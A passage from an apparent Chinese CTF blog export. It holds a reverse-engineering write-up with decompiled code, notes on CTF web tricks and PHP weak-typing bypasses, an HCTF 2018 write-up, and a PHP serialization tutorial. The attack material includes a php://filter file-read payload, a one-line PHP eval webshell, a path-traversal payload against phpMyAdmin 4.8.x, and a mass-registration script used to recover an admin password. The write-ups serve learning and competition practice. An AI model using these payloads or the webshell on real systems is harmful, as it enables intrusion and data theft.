[esp+45h] [ebp-67h] char ba_1; // [esp+56h] [ebp-56h] char b9_0; // [esp+7Ch] [ebp-30h] char b8_0; // [esp+7Dh] [ebp-2Fh] char b7_0; // [esp+7Eh] [ebp-2Eh] char b6_0; // [esp+7Fh] [ebp-2Dh] char b5_1; // [esp+80h] [ebp-2Ch] char b4_1; // [esp+81h] [ebp-2Bh] char b3_1; // [esp+82h] [ebp-2Ah] char b2_1; // [esp+83h] [ebp-29h] char b1_1; // [esp+85h] [ebp-27h] unsigned int v38; // [esp+8Ch] [ebp-20h] v38 = __readgsdword(0x14u); v2 = a2; while ( 2 ) &#123; memset(v5, 0, 0x80u); v3 = *(_BYTE *)(a1 + v2); v5[(v3 + 64) % 128] = 1; if ( (unsigned __int8)(v3 - 10) &lt;= 0x70u ) &#123; switch ( v3 ) &#123; case &apos;\\n&apos;: return v2 == 13 &amp;&amp; ba_1 != 0; case &apos;0&apos;: if ( v2 || !b9_0 ) return 0; v2 = 1; continue; case &apos;1&apos;: if ( v2 == 14 &amp;&amp; b8_0 ) goto LABEL_12; return 0; case &apos;2&apos;: if ( v2 == 20 &amp;&amp; b7_0 ) goto LABEL_15; return 0; case &apos;3&apos;: if ( v2 != 89 || !b6_0 ) return 0; v2 = 90; continue; case &apos;4&apos;: if ( v2 != 15 || !b5_1 ) return 0; v2 = 16; continue; case &apos;5&apos;: if ( v2 != 14 || !b4_1 ) return 0;LABEL_12: v2 = 15; continue; case &apos;6&apos;: if ( v2 != 12 || !b3_1 ) return 0; v2 = 13; continue; case &apos;7&apos;: if ( v2 != 5 || !b2_1 ) return 0; v2 = 6; continue; case &apos;8&apos;: result = 0; if ( b1_1 ) result = v2 == 33 || v2 == 2; return result; case &apos;9&apos;: if ( v2 != 1 || !b1_1 ) return 0; v2 = 2; continue; case &apos;a&apos;: if ( v2 != 35 || !b20_1 ) return 0; v2 = 36; continue; case &apos;b&apos;: if ( v2 != 11 || !b1f_1 ) return 0; v2 = 12; continue; case &apos;c&apos;: if ( v2 != 32 || !b20_1 ) return 0; v2 = 33; continue; case &apos;d&apos;: if ( v2 != 3 || !b1e_1 ) return 0; v2 = 4; continue; case &apos;e&apos;: if ( v2 != 7 || !b1d_1 ) return 0; v2 = 8; continue; case &apos;f&apos;: if ( !b1c_1 || v2 != 8 &amp;&amp; v2 != 4 ) return 0; goto LABEL_53; case &apos;g&apos;: return v2 == 12 &amp;&amp; b10_0 != 0; case &apos;h&apos;: if ( v2 != 13 || !b1b_1 ) return 0; v2 = 14; continue; case &apos;i&apos;: if ( v2 != 9 || !b1a_1 ) return 0; v2 = 10; continue; case &apos;j&apos;: if ( v2 != 10 || !b19_1 ) return 0; v2 = 11; continue; case &apos;k&apos;: return v2 == 12 &amp;&amp; b18_1 != 0; case &apos;l&apos;: if ( v2 != 19 || !b17_1 ) return 0; v2 = 20; continue; case &apos;m&apos;: if ( v2 != 17 || !b16_1 ) return 0; v2 = 18; continue; case &apos;n&apos;: return v2 == 18 &amp;&amp; b16_1 != 0; case &apos;o&apos;: if ( !b15_1 || v2 != 6 &amp;&amp; v2 != 28 ) return 0;LABEL_53: ++v2; continue; case &apos;p&apos;: if ( v2 != 30 || !b14_1 ) return 0; v2 = 31; continue; case &apos;q&apos;: if ( v2 != 29 || !b13_0 ) return 0; v2 = 30; continue; case &apos;r&apos;: if ( v2 != 20 || !b12_0 ) return 0;LABEL_15: v2 = 21; continue; case &apos;s&apos;: if ( v2 != 25 || !b11_0 ) return 0; v2 = 26; continue; case &apos;t&apos;: return v2 == 24 &amp;&amp; b12_0 != 0; case &apos;u&apos;: if ( v2 != 26 || !bf_0 ) return 0; v2 = 27; continue; case &apos;v&apos;: if ( v2 != 2 || !be_0 ) return 0; v2 = 3; continue; case &apos;w&apos;: if ( v2 != 6 || !bd_0 ) return 0; v2 = 7; continue; case &apos;x&apos;: if ( v2 != 22 || !bc_1 ) return 0; v2 = 23; continue; case &apos;y&apos;: if ( v2 != 23 || !bb_1 ) return 0; v2 = 24; continue; case &apos;z&apos;: return v2 == 21 &amp;&amp; b20_1 != 0; default: return 0; &#125; &#125; return 0; &#125;&#125; 根据switch中case的值和case中的if条件就可以反推出来正确的flag flag：09vdf7wefijbkAuth.exe32位的windows上可执行文件，无壳，先运行一下程序： 同样也是载入IDA中通过关键字符串查找关键代码（main函数），本函数前面定义了一大堆数据，最后经过sub_401500处理 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206int __cdecl main(int argc, const char **argv, const char **envp)&#123; const CHAR *v3; // ebx HMODULE v4; // eax void (__stdcall *v5)(HMODULE, LPCSTR); // eax char v7; // [esp+1h] [ebp-157h] char v8[4]; // [esp+15h] [ebp-143h] int v9; // [esp+20h] [ebp-138h] int v10; // [esp+26h] [ebp-132h] int v11; // [esp+2Ah] [ebp-12Eh] int v12; // [esp+2Eh] [ebp-12Ah] int v13; // [esp+32h] [ebp-126h] int v14; // [esp+36h] [ebp-122h] int v15; // [esp+3Ah] [ebp-11Eh] __int16 v16; // [esp+3Eh] [ebp-11Ah] int v17; // [esp+40h] [ebp-118h] int v18; // [esp+44h] [ebp-114h] int v19; // [esp+48h] [ebp-110h] int v20; // [esp+4Ch] [ebp-10Ch] int v21; // [esp+50h] [ebp-108h] int v22; // [esp+54h] [ebp-104h] int v23; // [esp+58h] [ebp-100h] int v24; // [esp+5Ch] [ebp-FCh] int v25; // [esp+60h] [ebp-F8h] int v26; // [esp+64h] [ebp-F4h] int v27; // [esp+68h] [ebp-F0h] int v28; // [esp+6Ch] [ebp-ECh] int v29; // [esp+70h] [ebp-E8h] char v30; // [esp+74h] [ebp-E4h] int a_2; // [esp+75h] [ebp-E3h] int v32; // [esp+79h] [ebp-DFh] int v33; // [esp+7Dh] [ebp-DBh] int v34; // [esp+81h] [ebp-D7h] int v35; // [esp+85h] [ebp-D3h] int v36; // [esp+89h] [ebp-CFh] int v37; // [esp+8Dh] [ebp-CBh] int v38; // [esp+91h] [ebp-C7h] __int16 v39; // [esp+95h] [ebp-C3h] int a_1; // [esp+97h] [ebp-C1h] int v41; // [esp+9Bh] [ebp-BDh] int v42; // [esp+9Fh] [ebp-B9h] int v43; // [esp+A3h] [ebp-B5h] int v44; // [esp+A7h] [ebp-B1h] int v45; // [esp+ABh] [ebp-ADh] int v46; // [esp+AFh] [ebp-A9h] int v47; // [esp+B3h] [ebp-A5h] char v48; // [esp+B7h] [ebp-A1h] int v49; // [esp+B8h] [ebp-A0h] int v50; // [esp+BEh] [ebp-9Ah] int v51; // [esp+C2h] [ebp-96h] int v52; // [esp+C6h] [ebp-92h] int v53; // [esp+CAh] [ebp-8Eh] int v54; // [esp+CEh] [ebp-8Ah] int v55; // [esp+D2h] [ebp-86h] int v56; // [esp+D6h] [ebp-82h] int v57; // [esp+DAh] [ebp-7Eh] char v58; // [esp+DEh] [ebp-7Ah] int v59; // [esp+DFh] [ebp-79h] int v60; // [esp+E3h] [ebp-75h] int v61; // [esp+E7h] [ebp-71h] int v62; // [esp+EBh] [ebp-6Dh] int v63; // [esp+EFh] [ebp-69h] int v64; // [esp+F3h] [ebp-65h] int v65; // [esp+F7h] [ebp-61h] int v66; // [esp+FBh] [ebp-5Dh] __int16 v67; // [esp+FFh] [ebp-59h] int v68; // [esp+101h] [ebp-57h] int v69; // [esp+105h] [ebp-53h] char v70; // [esp+109h] [ebp-4Fh] int v71; // [esp+10Ah] [ebp-4Eh] int v72; // [esp+10Eh] [ebp-4Ah] int v73; // [esp+112h] [ebp-46h] int v74; // [esp+116h] [ebp-42h] int v75; // [esp+11Ah] [ebp-3Eh] int v76; // [esp+11Eh] [ebp-3Ah] int v77; // [esp+122h] [ebp-36h] int v78; // [esp+126h] [ebp-32h] int v79; // [esp+12Ah] [ebp-2Eh] int v80; // [esp+12Eh] [ebp-2Ah] int v81; // [esp+132h] [ebp-26h] int v82; // [esp+136h] [ebp-22h] int v83; // [esp+13Ah] [ebp-1Eh] int v84; // [esp+13Eh] [ebp-1Ah] int v85; // [esp+142h] [ebp-16h] int v86; // [esp+146h] [ebp-12h] int v87; // [esp+14Ah] [ebp-Eh] __int16 v88; // [esp+14Eh] [ebp-Ah] int *v89; // [esp+150h] [ebp-8h] v89 = &amp;argc; sub_402940(); puts( &quot; . \\n&quot; &quot; _|_ ROBOTIC AUTHENTICATION SYSTEM\\n&quot; &quot; /\\\\/\\\\ (. .) /\\n&quot; &quot; `||&apos; |#| \\n&quot; &quot; ||__.-\\&quot;-\\&quot;-.___ \\n&quot; &quot; `---| . . |--.\\\\ \\n&quot; &quot; | : : | ,||,\\n&quot; &quot; `..-..&apos; \\\\/\\\\/\\n&quot; &quot; || || \\n&quot; &quot; || || \\n&quot; &quot; |__|__| \\n&quot;); v49 = 0x539; v50 = 0x60646D51; v51 = 0x64216472; v52 = 0x7364756F; v53 = 0x64697521; v54 = 0x73686721; v55 = 0x51217572; v56 = 0x76727260; v57 = 0x3B65736E; v58 = 1; a_1 = 0x60646D51; v41 = 0x64216472; v42 = 0x7364756F; v43 = 0x64697521; v44 = 0x73686721; v45 = 0x51217572; v46 = 0x76727260; v47 = 0x3B65736E; v48 = 1; v59 = 0x60646D51; v60 = 0x64216472; v61 = 0x7364756F; v62 = 0x64697521; v63 = 0x62647221; v64 = 0x21656F6E; v65 = 0x72726051; v66 = 0x65736E76; v67 = 315; a_2 = 0x60646D51; // Please enter the second Password v32 = 0x64216472; v33 = 0x7364756F; v34 = 0x64697521; v35 = 0x62647221; v36 = 0x21656F6E; v37 = 0x72726051; v38 = 0x65736E76; v39 = 315; v68 = 0x6F6F3074; v69 = 0x666D3367; v70 = 3; v28 = 0x6F6F3074; v29 = 0x666D3367; v30 = 3; v71 = 0x6F73646A; v72 = 0x33326D64; v73 = 0x6D6D652F; v74 = 0x13F0101; v24 = 0x6F73646A; v25 = 0x33326D64; v26 = 0x6D6D652F; v27 = 0x13F0101; v75 = 0x57656540; v76 = 0x6E756264; v77 = 0x44656473; v78 = 0x71646279; v79 = 0x6F6E6875; v80 = 0x656F6049; v81 = 0x173646D; v17 = 0x57656540; v18 = 0x6E756264; v19 = 0x44656473; v20 = 0x71646279; v21 = 0x6F6E6875; v22 = 0x656F6049; v23 = 0x173646D; v82 = 0x21746E58; v83 = 0x2F6F6876; v84 = 0x6F6E4221; v85 = 0x75607366; v86 = 0x75606D74; v87 = 0x726F6E68; v88 = 0x120; v10 = 0x21746E58; v11 = 0x2F6F6876; v12 = 0x6F6E4221; v13 = 0x75607366; v14 = 0x75606D74; v15 = 0x726F6E68; v16 = 0x120; v9 = 0x539; strcpy(v8, &quot;r0b0RUlez!&quot;); dword_40AD94 = (int)&amp;v9; dword_40ADA0 = (int)&amp;v49; dword_40AD8C = (char *)&amp;a_1; dword_40AD90 = (char *)&amp;a_2; dword_40AD98 = (int)&amp;v28; lpProcName = (LPCSTR)&amp;v17; lpModuleName = (LPCSTR)&amp;v24; dword_40ADA4 = (char *)&amp;v10; sub_401500(0); v3 = lpProcName; v4 = GetModuleHandleA(lpModuleName); v5 = (void (__stdcall *)(HMODULE, LPCSTR))GetProcAddress(v4, v3); v5((HMODULE)1, (LPCSTR)sub_40157F); puts(dword_40AD8C); scanf(&quot;%20s&quot;, &amp;v7); if ( !strcmp(&amp;v7, v8) ) &#123; puts(&quot;You passed level1!&quot;); sub_4015EA(0); &#125; return 0;&#125; 在sub_401500函数中对刚刚定义的数据的每一位都和1异或先把数据解密一下：12345678910111213141516171819202122232425262728293031323334353637data1=&quot;516D6460726421646F756473217569642167687372752151607272766E73653B&quot;str1 =&quot;&quot;for x in range(0,len(data1),2): str1 += chr(eval(&quot;0x&quot;+data1[x:x+2])^1)print str1data2 = &quot;516D6460726421646F75647321756964217264626E6F652151607272766E73653B&quot;str2 =&quot;&quot;for x in range(0,len(data2),2): str2 += chr(eval(&quot;0x&quot;+data2[x:x+2])^1)print str2data3 = &quot;74306F6F67336D66&quot;str3 =&quot;&quot;for x in range(0,len(data3),2): str3 += chr(eval(&quot;0x&quot;+data3[x:x+2])^1)print str3data4 = &quot;6A64736F646D32332F656D6D&quot;str4 = &quot;&quot;for x in range(0,len(data4),2): str4 += chr(eval(&quot;0x&quot;+data4[x:x+2])^1)print str4data5 = &quot;406565576462756E736465447962647175686E6F49606F656D6473&quot; str5 = &quot;&quot;for x in range(0,len(data5),2): str5 += chr(eval(&quot;0x&quot;+data5[x:x+2])^1)print str5data6 = &quot;586E742176686F2F21426E6F66736075746D6075686E6F7220&quot;str6 = &quot;&quot;for x in range(0,len(data6),2): str6 += chr(eval(&quot;0x&quot;+data6[x:x+2])^1)print str6 输出结果：发现是一些需要输出的字符串 接下来程序接收一个字符串，与字符串“r0b0RUlez!”进行比较，这是第一层限制，然后来到函数sub_4015EA，在这个里面构造了一个异常，当程序走到这里的时候，发生异常而进行跳转，在跳转之前改变了一个数据，第二跳是在这个函数中的，那么我们就跟进第一条 跟进之后来到一个函数中，再接收一个字符串，进入sub_401547进行比较 在sub_401547函数中对字符串“u1nnf2lg”每一位都与2异或 解密得到“w3lld0ne”12345flag = &quot;u1nnf2lg&quot;real_flag =&quot;&quot;for x in range(len(flag)): real_flag+=chr(ord(flag[x])^2)print real_flag 最后将字符串拼接起来 flag：r0b0RUlez!_w3lld0ne","categories":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/categories/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"CTF中常见的web","slug":"CTF中常见的web","date":"2019-03-10T07:18:34.261Z","updated":"2019-03-10T07:24:02.840Z","comments":true,"path":"2019/03/10/CTF中常见的web/","link":"","permalink":"http://yoursite.com/2019/03/10/CTF中常见的web/","excerpt":"CTF常见的web题网页注释有些题会在网页注释给出提示信息，比如给出一部分源码","text":"CTF常见的web题网页注释有些题会在网页注释给出提示信息，比如给出一部分源码 表单标签的属性比如修改input标签的maxlenth属性来得到flag 伪造IPX-Forwarded-For:127.0.0.1 body标签之外有时候题目作者会把提示放在body标签和html标签之间，这样提示不会出现在网页页面，需要查看网页源码才能看到。 数据包信息隐藏在数据包的请求头和响应头里，通过抓包来获取 robots.txt一般网站会有robots.txt来规范爬虫的行为，利用robots.txt有可能获取到网站重要文件所在的位置 备份文件（还没见过）某些编译器会在编译时生成一些备份文件，如果不写正确处理这些文件，黑客可以利用这些文件来还原源码如： 网站备份压缩 .rar .zip .7z .tar.gz .bak PHP代码审计(常见漏洞)is_numeric(mixed $var)这是检测变量是否为数字或者数字字符串 有时候会需要绕过该函数的判断，课以利用科学计数法 如 1 == 1E+0 strip_tags(string allow)的逻辑错误这是一个剥去字符串中html、xml以及php的标签的函数。 allow可选。规定允许的标签，这些标签会不会被删除 有些代码会将该函数放在过滤代码之后，那么可以通过在payload中嵌入HTML、XML 以及PHP标签的方式绕过之前的过滤代码。 urldecode()逻辑漏洞同strip_tags(),将该函数放在判断函数之后的话可通过对payload的二次url编码绕过之前的判断函数。 本地包含 eval()函数把字符串按照PHP代码执行 var_dump()打印变量的相关信息 show_source() 函数对文件进行语法高亮显示 如果以上变量函数可控且未经处理，可执行恶意代码 $GLOBALS$GLOBALS：是一个数组，包含了全局作用域中可用的全部变量。变量的名字就是数组的键。合理利用$GLOBALS全局变量也许可以获得可利用变量信息。常与var_dump()函数连用。 php://伪协议php://filter伪协议php://filter 的参数列表 read 读取 write 写入 resource 数据来源(必须的) read参数值可以为 string.stip_tags 将数据流中的HTML标签清除 string.toupper 将数据流中的内容转换为大写 string.tolower 将数据流中的内容转换为小写 convert.base64-encode 将数据流中的内容转换为base64编码 convertr.base64-decode 与上面对应的解码 利用这个函数漏洞需和文件包含漏洞一起使用，可以读取网页的PHP源代码 index.php?file=php://filter/read=convert.base64-encode/resource=index.php php://input 一句话木马php://input 用来接收post数据的 可以接收一句话木马&lt;?php eval($_POST[‘a’]); ?&gt;","categories":[{"name":"web","slug":"web","permalink":"http://yoursite.com/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"PHP的黑魔法","slug":"PHP的黑魔法","date":"2019-03-10T07:18:34.261Z","updated":"2019-03-10T07:24:09.621Z","comments":true,"path":"2019/03/10/PHP的黑魔法/","link":"","permalink":"http://yoursite.com/2019/03/10/PHP的黑魔法/","excerpt":"弱比较若字符串以数字开头，则取开头数字作为转换结果，若无则输出01&apos;123abc&apos; == 123","text":"弱比较若字符串以数字开头，则取开头数字作为转换结果，若无则输出01&apos;123abc&apos; == 123 md5(),sha1()md5()是不能处理数组的 md5(数组)会返回null，两个null相等绕过 1md5([1]) == md5([2]) sha1()函数也是这样 md5($pass,true)可以让pass=ffifdyop 绕过 intval()intval()转换的时候，会将从字符串的开始进行转换直到遇到一个非数字的字符。 即使出现无法转换的字符串也不会报错的，会直接返回0 1234var_dump((int)(&apos;1e-1000&apos;)&gt;0); // 1&gt;0echo &quot;&lt;br&gt;&quot;;var_dump(&apos;1e-1000&apos;&gt;0);echo &quot;&lt;br&gt;&quot;; 输出结果为： 12bool(true)bool(false) 1234var_dump((int)(&apos;1e-10&apos;)&gt;0); echo &quot;&lt;br&gt;&quot;;var_dump(&apos;1e-10&apos;&gt;0);echo &quot;&lt;br&gt;&quot;; 输出结果为： 12bool(true)bool(true) strcmp()函数strcnp()函数只有在相等的情况下才会返回0 若果我们传入一个数组，他会返回NULL,而判断使用的是\\==而NULL==0是bool(true)，这样就成功绕过。 12345678$a=[];if(strcmp($a,&quot;haha&quot;))&#123; echo 1;&#125;else&#123; echo 2;&#125; 输出的结果 12 说明可以绕过strcmp()函数 ereg()函数字符串对比解析，ereg函数存在NULL截断漏洞，当ereg读取字符串string时,如果遇到了%00,后面的字符串就不会被解析。 is_numeric()函数 当有两个is_numeric判断并用and后面的is_numeric可以绕过 123456789$a = [];$b = aaa;if(is_numeric($b) == is_numeric($a))&#123; echo 1;&#125;else&#123; echo 2;&#125;echo &quot;&lt;br&gt;&quot;; 输出结果11 说明第二个变量我们可以任意输入，可以绕过 16进制也可以绕过is_numeric()检验，可以用来绕过sql注入里的过滤 123456789$a = 8;$b = 0x8;if(is_numeric($a) == is_numeric($b))&#123; echo 1;&#125;else&#123; echo 2;&#125;echo &quot;&lt;br&gt;&quot;; 输出结果 11 说明可以绕过16进制也可以绕过 switch()函数当switch没有break时可以继续往下执行。这里也有自动转换，比如$switch_bug = a,会当0执行，$switch_bug =1a，会当1执行…… array_search()函数用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。 当检索中带入字符串，比如”sky”，会intval(‘sky’)==0，从而致使数字数组也可以查询成功 1234567$array_search=[&apos;haha&apos;,&apos;hehe&apos;,0];$eee = @array_search(&quot;XMAN&quot;, $array_search);if($eee)&#123; echo &quot;array_search()检索字符串绕过成功&quot;;&#125;else&#123; echo &quot;array_search()检索字符串绕过失败&quot;;&#125; 输出结果： 1array_search()检索字符串绕过成功","categories":[{"name":"web","slug":"web","permalink":"http://yoursite.com/categories/web/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://yoursite.com/tags/PHP/"}]},{"title":"HCTF 2018 wp","slug":"HCTF-2018-wp","date":"2019-01-08T15:50:09.000Z","updated":"2019-05-08T16:13:33.147Z","comments":true,"path":"2019/01/08/HCTF-2018-wp/","link":"","permalink":"http://yoursite.com/2019/01/08/HCTF-2018-wp/","excerpt":"HCTF2018","text":"HCTF2018 web 签到题 warmup点击之后发现是个文件包含类型的 url:http://warmup.2018.hctf.io/index.php?file=hint.php source.php的源码也有 &lt;?php class emmm { public static function checkFile(&amp;$page) { $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) { echo &quot;you can&apos;t see it&quot;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . &apos;?&apos;, &apos;?&apos;) ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &apos;?&apos;, &apos;?&apos;) ); if (in_array($_page, $whitelist)) { return true; } echo &quot;you can&apos;t see it&quot;; return false; } } if (! empty($_REQUEST[&apos;file&apos;]) &amp;&amp; is_string($_REQUEST[&apos;file&apos;]) &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;]) ) { include $_REQUEST[&apos;file&apos;]; exit; } else { echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; } ?&gt; 可以看到对我们传入的参数一定的要求 if (!empty($_REQUEST[&apos;file&apos;]) &amp;&amp;is_string($_REQUEST[&apos;file&apos;]) &amp;&amp;emmm::checkFile($_REQUEST[&apos;file&apos;]) ) 发现只有source.php hint.php 才能绕过截取 $whitelist=[&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; 截取函数 截取你传入参数?前的内容 $_page = mb_substr( $_page, 0, mb_strpos($_page . &apos;?&apos;, &apos;?&apos;) 判断截取的内容是否在数组whitelist里面 if (in_array($_page, $whitelist)) { return true; } echo &quot;you can&apos;t see it&quot;; return false; 所以要利用?截取处hint.php或者source.php，利用hint。php成为一个不存在的目录，最后include利用../../跳出目录来读取flag payload: index.php?file=source.php?/../../../../ffffllllaaaagggg index.php?file=hint.php?/../../../../ffffllllaaaagggg ps 直接把source的源码复制搜索就可以找到这个漏洞 受影响版本: phpMyAdmin4.8.0 phpMyAdmin4.8.1 https://blog.csdn.net/nzjdsds/article/details/81260335 Game注册账号进去之后发现，他将所有的用户名的列了出来 http://game.2018.hctf.io/web2/user.php?order=id 通过URL发现排序的方式是可控的所以我们让他按密码排序 http://game.2018.hctf.io/web2/user.php?order=password 然后通过建立不同的账号密码来确定admin的密码 admin的账号的id为1 这是网上大佬批量注册账号的代码通过这个账号来手工测试密码 import requests import hashlib import threading def md5(str): sha = hashlib.md5(str) encrypts = sha.hexdigest() return encrypts def reg(username,password): url = &apos;http://game.2018.hctf.io/web2/action.php?action=reg&apos; data = { &quot;username&quot;:username, &quot;password&quot;:password, &quot;sex&quot;:&quot;1&quot;, &quot;submit&quot;:&quot;submit&quot; } headers = { &apos;Connection&apos;: &apos;close&apos;, } r = requests.post(url=url,data=data,headers=headers) def fuzz(start,end): for i in range(start,end): password = &apos;dSa8&amp;&amp;!@#$%^&amp;d1nGy1aS3dj&apos;+chr(i) username=md5(password) content = username + &quot; &quot; + password +&quot; &quot;+ str(i) + &quot;\\n&quot; reg(username, password) print content print str(start)+&apos;~&apos;+str(end)+&quot;complete&quot; step=20 for i in range(33,127,step): t = threading.Thread(target=fuzz, args=(i, i+step)) t.start() 注册好多号不断的逼近admin的密码，登录后访问flag.php【user.php里有提示】，拿到flag。","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"初识php反序列化","slug":"初识php反序列化","date":"2019-01-08T15:39:38.000Z","updated":"2019-05-08T15:41:26.932Z","comments":true,"path":"2019/01/08/初识php反序列化/","link":"","permalink":"http://yoursite.com/2019/01/08/初识php反序列化/","excerpt":"php的序列化与反序列化关于这个时有两个函数的 serialize()和unserialize()","text":"php的序列化与反序列化关于这个时有两个函数的 serialize()和unserialize() serialize()函数当在php创建了一个对象后，可以通过serialize()函数把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。 序列化格式整形的序列化格式12345678&lt;?php $number = 34; var_dump(serialize($number));?&gt;输出结果为：string(5) &quot;i:34;&quot; 解释：123因为serialize()函数所以输出的是一个字符串类型的i表示integer类型34就是变量的值 doule类型的序列化格式12345678&lt;?php $double = 5.5; var_dump(serialize(double));?&gt;输出结果为：string(6) &quot;d:5.5;&quot; 解释12d 表示double类型5.5 为变量的值 string类型的序列化格式12345678&lt;?php $str = &apos;chuddy&apos;; var_dump(serialize($str)); echo &quot;&lt;br&gt;&quot;;?&gt;输出结果为：string(13) &quot;s:6:&quot;chuddy&quot;;&quot; 解释：12s 代表string类型chuddy 为变量的值 布尔类型的序列化格式123456789101112&lt;?php $bool = true; $bool_1 = false; var_dump(serialize($bool)); echo &quot;&lt;br&gt;&quot;; var_dump(serialize($bool_1)); echo &quot;&lt;br&gt;&quot;;?&gt;输出结果：string(4) &quot;b:1;&quot;string(4) &quot;b:0;&quot; 解释： 123b 表示布尔类型1 表示布尔变量的值为true0 表示布尔类型的值为false null类型的序列化格式1234567&lt;?php $null = null; var_dump(serialize($null));?&gt;输出结果：string(2) &quot;N;&quot; 解释1N 代表的null类型 数组类型的序列化格式12345678&lt;?php $arr = array(&apos;a&apos; =&gt; 1, &apos;b&apos; =&gt; 2); var_dump(serialize($arr)); echo &quot;&lt;br&gt;&quot;;?&gt;输出结果：string(30) &quot;a:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;&quot; 解释：123a 表示array类型2 表示数组的长度&#123;&#125; 内的时数组各个值得类型，长度以及值 类的序列化格式1234567891011121314151617&lt;?phpclass chuddy &#123; public $data; private $pass; public function __construct($data, $pass) &#123; $this-&gt;data = $data; $this-&gt;pass = $pass; &#125;&#125;$cc = new chuddy(&apos;chuddy&apos;, &apos;haha&apos;);var_dump(serialize($cc));?&gt;输出结果为：string(72) &quot;O:6:&quot;chuddy&quot;:2:&#123;s:4:&quot;data&quot;;s:6:&quot;chuddy&quot;;s:12:&quot;chuddypass&quot;;s:4:&quot;haha&quot;;&#125;&quot; 解释：12O 代表对象类型2 代表类里的变量多少 序列化对象12345678910111213141516171819202122232425262728class CB &#123; public $CB_data = &apos;cb&apos;;&#125;class CC extends CB&#123; const SECOND = 60; public $data; private $pass; public function __construct($data, $pass) &#123; $this-&gt;data = $data; $this-&gt;pass = $pass; &#125; public function setPass($pass) &#123; $this-&gt;pass = $pass; &#125;&#125;$cc = new CC(&apos;uu&apos;, true);var_dump(serialize($cc));输出结果为：string(75) &quot;O:2:&quot;CC&quot;:3:&#123;s:4:&quot;data&quot;;s:2:&quot;uu&quot;;s:8:&quot; CC pass&quot;;b:1;s:7:&quot;CB_data&quot;;s:2:&quot;cb&quot;;&#125;&quot; 序列化对象时，不会保存常量的值。对于父类中的变量，则会保留。 对象序列化自定义在序列化对象时，有一些敏感数据，我们不需要保存，这里该如何处理呢 在我们调用serialize()函数时，该函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化的操作。可以通过重载这个方法，从而自定义序列化行为 123456789101112131415161718192021222324252627class User&#123; const SITE = &apos;uusama&apos;; public $username; public $nickname; private $password; public function __construct($username, $nickname, $password) &#123; $this-&gt;username = $username; $this-&gt;nickname = $nickname; $this-&gt;password = $password; &#125; // 重载序列化调用的方法 public function __sleep() &#123; // 返回需要序列化的变量名，过滤掉password变量 return array(&apos;username&apos;, &apos;nickname&apos;); &#125;&#125;$user = new User(&apos;uusama&apos;, &apos;uu&apos;, &apos;123456&apos;);var_dump(serialize($user));返回结果为：string(67) &quot;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;uusama&quot;;s:8:&quot;nickname&quot;;s:2:&quot;uu&quot;;&#125;&quot; 这样就忽略了password字段的值 可以保护敏感数据 总结所以序列化对于不同类型得到的字符串格式为： String : s:size:value; Integer : i:value; Boolean : b:value;(保存1或0) Null : N; Array : a:size:{key definition;value definition;(repeated per element)} Object : O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)} 反序列化反序列化函数unserialize()反序列化函数用于将单一的已序列化的变量转换回PHP的值注意： 如果传递的字符串不可解序列化，则返回false，并产生一个E_NOTICE 返回的是转换之后的值，可为integer、float、string、array或object 若被反序列化的变量时一个对象，在成功重新构造对象之后，PHP会自动的试图去调用__wakeup()成员函数（如果存在的话） 12345678910111213141516171819202122232425262728293031323334class User&#123; const SITE = &apos;uusama&apos;; public $username; public $nickname; private $password; public function __construct($username, $nickname, $password) &#123; $this-&gt;username = $username; $this-&gt;nickname = $nickname; $this-&gt;password = $password; &#125; // 重载序列化调用的方法 public function __sleep() &#123; // 返回需要序列化的变量名，过滤掉password变量 return array(&apos;username&apos;, &apos;nickname&apos;); &#125; public function __wakeup() &#123; $this-&gt;password = $this-&gt;username; &#125;&#125;$user_ser = &apos;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;uusama&quot;;s:8:&quot;nickname&quot;;s:2:&quot;uu&quot;;&#125;&apos;;var_dump(unserialize($user_ser))输出结果：object(User)#3 (3) &#123; [&quot;username&quot;]=&gt; string(6) &quot;uusama&quot; [&quot;nickname&quot;]=&gt; string(2) &quot;uu&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; string(6) &quot;uusama&quot; &#125; 我也尝试了一下没有__wakeup()的情况 输出结果为：object(User)#3 (3) &#123; [&quot;username&quot;]=&gt; string(6) &quot;uusama&quot; [&quot;nickname&quot;]=&gt; string(2) &quot;uu&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; NULL &#125; __wakeup()函数在对象被构建以后执行，所以$this-&gt;username的值不为空 反序列化时，会尽量将变量值进行匹配并复制给序列化后的对象 未定义的类的处理123456$user_ser = 